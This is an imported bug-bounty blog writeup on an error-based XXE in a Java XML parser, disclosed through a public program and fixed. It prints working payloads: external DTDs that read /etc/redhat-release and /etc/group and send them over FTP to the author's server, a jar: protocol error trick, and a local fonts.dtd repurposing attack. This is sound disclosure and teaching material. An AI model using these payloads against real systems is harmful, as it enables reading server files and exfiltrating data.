---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-05-31_h1error-based-xxe-bug-bounty-writeup.md
original_filename: 2020-05-31_h1error-based-xxe-bug-bounty-writeup.md
title: h1{Error based XXE - bug bounty writeup}
category: blogs
detected_topics:
- ssrf
- command-injection
- file-upload
- api-security
tags:
- imported
- blogs
- ssrf
- command-injection
- file-upload
- api-security
language: en
raw_sha256: 8a1407a4d3ec40d88781190dac0a248167dd88f05d8ce435a907e758ba447aa5
text_sha256: f1a28b6e42e0a42280a1275d25ae10786c875a2e8bca4690375384ceb1077487
ingested_at: '2026-06-28T07:32:02Z'
sensitivity: unknown
redactions_applied: false
---

# h1{Error based XXE - bug bounty writeup}

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-05-31_h1error-based-xxe-bug-bounty-writeup.md
- Source Type: markdown
- Detected Topics: ssrf, command-injection, file-upload, api-security
- Ingested At: 2026-06-28T07:32:02Z
- Redactions Applied: False
- Raw SHA256: `8a1407a4d3ec40d88781190dac0a248167dd88f05d8ce435a907e758ba447aa5`
- Text SHA256: `f1a28b6e42e0a42280a1275d25ae10786c875a2e8bca4690375384ceb1077487`


## Content

---
title: "h1{Error based XXE - bug bounty writeup}"
page_title: "h1{Error based XXE - bug bounty writeup} - f4d3.io [Bourne Again]"
url: "https://f4d3.io/xxe_wild/"
final_url: "https://f4d3.io/xxe_wild/"
authors: ["f4d3 (@f4d3_cl)"]
bugs: ["XXE"]
publication_date: "2020-05-31"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4540
---

[BUGBOUNTY](/tags/#bugbounty), [WRITEUP](/tags/#writeup), [XXE](/tags/#xxe), [XML](/tags/#xml), [HACKERONE](/tags/#hackerone)

# h1{Error based XXE - bug bounty writeup}

May 31, 2020  f4d3 May 31, 2020  f4d3

# Recon

#  Recon 

Hi everyone!

Here’s a writeup of an XXE found in the wild on a public bugbounty program.

During my usual recon, I’ve found something very interesting on the **“ZOOOOOOOOM”** application of `XXX` company.

This, just respond with an `"Invalid XML"` :eyes:, this caugth my attention very heavily, so I started to test it with my usual `XXE` payloads. for my bad luck, I couldn’t get the output of the `XML parser` on the page,

![](assets/error_basedxxe-193695c0.png)

The first one was just to check if the `DOCTYPE` definition was enable, normally in `java servlets applications`, you can `turn off` the parse of customs `DOCTYPE's` if you want it, but this time (Luckily), it was enable, but just a `DNS` request came out of the company, not a `HTTP Request.`, this allow me to think that a `external entity` attack can be exploited.
  
  
  <?xml version="1.0" ?>
  <!DOCTYPE root [
  <!ENTITY % ext SYSTEM "http://k8tm8ep85umg95uxhsehjpayqpwfk4.burpcollaborator.net/x"> %ext;
  ]>
  <r></r>
  

If everything is working fine for me, it will make a `DNS` resolution, and a `HTTP_REQUEST` to my `burpcollaborator`, but damn, just the `DNS request` came.

![](assets/error_basedxxe-edbab2ef.png) ![](assets/error_basedxxe-59d42472.png)

#  exploit 

hmmm … Having this in mind, It’s easy to think that the target is behind a big `firewall`, damn…

![](https://media.giphy.com/media/bQ4qx1qT28rHG/source.gif)

Taking a break from this, and thinking a while with a `tea`, I remembered a nice `BugBounty` writeup from [STÖK](https://youtu.be/aSiIHKeN3ys), where he explain a `XXE`, making the parser `fetch` something from inside the company.

Well, I tried to do the same, I used a `document upload` on another endpoint that I found some time ago, lets name it as: `abc.company.com/upload`.

The fact is that the `upload` function, let anyone to upload a `document`, `pdf,txt,docx,...`, this allow me to fetch it **TEMPORALY** with a simple `GET REQUEST` (world-readable file). If the `parser`, trust on `*.company.com`, The server will successfully, fetch my own `DTD` .

So I did it, I uploaded a custom `dtd` file to the server that will declare a `variable` with arbitrary content, then, I’ll try to exfiltrate it.  
We can’t fetch anything external with `HTTP requests`, so my first aproach, was exfiltrate it via `FTP`, using the `xxeserv in GO`.

`external.dtd`
  
  
  <!ENTITY % payload SYSTEM "file:///etc/redhat-release">
  <!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'ftp://bbounty.f4d3.io:23/%payload;'>">
  %int;
  %trick;
  

Sending to the server, the following:
  
  
  <?xml version="1.0" ?>
  <!DOCTYPE foo [
  <!ENTITY % payload SYSTEM "file:///etc/">
  <!ENTITY % dtd SYSTEM "ftp://bbounty.f4d3.io/poc2.txt">
  %dtd;
  %release;
  ]><foo>ehlo</foo>
  

The last release, was just to trigger the error on the parser.

![](assets/error_basedxxe-a5c8c5db.png)

![](assets/error_basedxxe-b1fab167.png)

It worked!

![](assets/error_basedxxe-a4f74b77.png)

![](assets/error_basedxxe-bec82054.png)

btw, I wasn’t getting anything good, just the default password that is using the parser, btw, was the only thing that I needed, Now I knew that was a `Java 1.8>` (leaked from the password used by the app.), there’s a big difference on the `XML parsers` for `Java 1.8<` and `java 1.8>`, I know from `HTB and CTF's` ❤️ , that this parser can be abused via `induced error` :D …

Another `tea`, and another couple hours reseaching more about this `java version`, `xml parser error exceptions`, and something very important when talking about `SSRF's, and XXE's`: **protocols**.

After reading everything about the things that I just said for the entire day, I reach this [paper](https://www.blackhat.com/docs/us-15/materials/us-15-Wang-FileCry-The-New-Age-Of-XXE-java-wp.pdf), which expose the `XXE` on `JDK context`, which is pretty nice, this paper point me to the right direction to exploit this thing, the **jar** protocol.

The **jar://** scheme, is a protocol used by the `JDK` to fetch a `jar` file (which is simple a `.zip` file) over the network, decompress it, and use an entry on the `jar file`, with the following syntax:

  * `jar:<url>!/{entry}`

With this in mind, I can force an error on the `parser`, which will try to fetch a `jar` file on `jar://</our/desire/file>!/nonimportantthing`, with this, the parser will say happy:

  * Hey! I cant fetch `jar://content-of-/etc/hosts` ! LoL

Another thing to put on the table… That I didn’t realize inmediatly… I tried to `exfiltrate` data over the `ftp`… which means that **Outbound connections to FTP servers are allowed…** , this make everything easier, because we can `fetch` the `evil.dtd file`, over the network to our `own` ftp server, so, forget about the `file upload thing` :laughing:

The `evil.dtd` file, ended up like this:
  
  
  <!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'jar:%payload;.domainwithoutimportance!/'>">
  %int;
  %trick;
  
  

And the request:
  
  
  <?xml version="1.0" ?>
  <!DOCTYPE root [
  <!ENTITY % payload SYSTEM "file:///etc/group">
  <!ENTITY % ext SYSTEM "ftp://bbounty.f4d3.io/poc2.txt">
  %ext;
  ]>
  <root></root>
  
  

![](assets/error_basedxxe-0c7095c3.png)

![](assets/error_basedxxe-4089651b.png)

pwn!

![](https://media.giphy.com/media/voOhKPgzYsyPu/source.gif)

The xml after the `fetch, will end like this`
  
  
  <?xml version="1.0" ?>
  <!DOCTYPE root [
  <!ENTITY % payload SYSTEM "file:///etc/group">
  <!ENTITY % ext SYSTEM "ftp://bbounty.f4d3.io/poc2.txt">
  <!ENTITY % trick SYSTEM "jar:%payload;.domainwithoutimportance!/">
  ]>
  <root></root>
  
  

#  Using local entities 

After that I report this issue, I came back to the endpoint to test something that I read while ago, that I missed to try. `Local DTD Files` [nice article](https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/)

The main idea of this attack, is to use a local `.dtd` file on the server, this allows you to rewrite it, and put your own definitions there while parsing it.

So, I used the same idea to enumerate the files on the server (not the exploit, the `parser oracle`), and I found one local interesting `dtd` file.

![](assets/error_basedxxe-fde48e79.png)

![](assets/error_basedxxe-6fd5f944.png)

Using the `(No such file or directory)` thing as an oracle, I could know what `dtd's` exists on the filesystem, [knowing the dtd file](https://github.com/behdad/fontconfig/blob/master/fonts.dtd), now I know that I can replace the `constant` ENTITY, and the `expr` ENTITY, which allows me to craft a exploit that will rewrite it on the fly.
  
  
  <?xml version="1.0" ?>
  <!DOCTYPE root [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
  <!ENTITY % expr 'aaa)>
  <!ENTITY &#x25; file SYSTEM "file:///etc/group">
  <!ENTITY &#x25; int "<!ENTITY &#x26;#x25; trick SYSTEM &#x27;jar://&#x25;file;!/&#x27;>">
  &#x25;int;
  &#x25;trick;
  <!ELEMENT aa (bb'>
  
  %local_dtd;
  ]>
  <root></root>
  

![](assets/error_basedxxe-1b0db7e9.png)

Pwned again, without external interaction !

#  Conclusion 

  * Aim for something else than the `server-side port scanning SSRF`.
  * If you can’t get a free `HTTP` request, there’s some other options that you can try… `ftp,netdoc,jar,gopher,etc`, to other ports too (do not forget `IPV6`).
  * If it seems weird, you’re probably right :D

#  Timeline 

  * Jan 3th (Discovery)
  * Jan 5th Reported
  * Jan 6th Requested more info
  * Jan 10th Info given
  * Jan 13th Triaged as `P1`
  * Mar 6th Resolved/Fixed ( **yay!** )
